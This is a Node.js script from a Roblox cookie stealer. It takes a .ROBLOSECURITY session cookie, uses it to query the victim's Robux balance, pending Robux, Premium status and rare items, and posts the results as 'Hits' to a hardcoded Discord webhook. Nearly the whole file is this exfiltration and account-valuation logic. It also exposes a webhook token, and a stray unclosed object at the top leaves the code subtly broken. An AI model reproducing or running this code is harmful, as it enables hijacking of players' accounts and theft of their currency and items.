const fetch = require("node-fetch");
const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";

let embed = {
  content: "@everyone Hits", // 👈 this makes the ping

async function sendAccount(cookie) {
  try {
    // --- Get User Info ---
    let userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!userRes.ok) throw new Error("Invalid cookie");
    let user = await userRes.json();

    // --- Robux Balance ---
    let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    let economy = economyRes.ok ? await economyRes.json() : { robux: 0 };

    // --- Pending Robux ---
    let pendingRes = await fetch(
      `https://economy.roblox.com/v2/users/${user.id}/transaction-totals?timeFrame=Month&transactionType=summary`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } }
    );
    let pending = pendingRes.ok ? await pendingRes.json() : { pendingRobuxTotal: 0 };

    // --- Premium ---
    let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    let premium = premiumRes.ok ? await premiumRes.json() : false;

    // --- Avatar Thumbnail ---
    let thumbRes = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
    );
    let thumbJson = await thumbRes.json();
    let thumbnailUrl = thumbJson.data?.[0]?.imageUrl || null;

    // --- Korblox & Headless (asset ids) ---
    let korbloxRes = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Asset/1818`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    let korblox = korbloxRes.ok ? await korbloxRes.json() : { data: [] };

    let headlessRes = await fetch(`https://inventory.roblox.com/v1/users/${user.id}/items/Asset/134082579`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    let headless = headlessRes.ok ? await headlessRes.json() : { data: [] };

    // --- Prepare Stats ---
    let robux = economy.robux ?? 0;
    let pendingRobux = pending.pendingRobuxTotal ?? 0;

    let statistics = {
      Username: user.name,
      Robux: robux,
      PendingRobux: pendingRobux,
      Premium: premium,
      Summary: robux + pendingRobux,
      Korblox: (korblox.data?.length > 0) ? "✅ Yes" : "❌ No",
      Headless: (headless.data?.length > 0) ? "✅ Yes" : "❌ No"
    };

    // --- Discord Embed ---
    let embed = {
      username: "ENTERPRISE",
      avatar_url: thumbnailUrl,
      embeds: [
        {
          title: `Roblox Account Info`,
          thumbnail: { url: thumbnailUrl },
          color: 0x2f3136,
          fields: [
            { name: "Username", value: statistics.Username, inline: true },
            { name: "Robux", value: String(statistics.Robux), inline: true },
            { name: "Pending Robux", value: String(statistics.PendingRobux), inline: true },
            { name: "Premium", value: String(statistics.Premium), inline: true },
            { name: "Summary", value: String(statistics.Summary), inline: true },
            { name: "Korblox", value: statistics.Korblox, inline: true },
            { name: "Headless", value: statistics.Headless, inline: true }
          ],
          footer: { text: "ENTERPRISE" }
        }
      ]
    };

    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    });

  } catch (err) {
    console.error("Error:", err.message);
  }
}
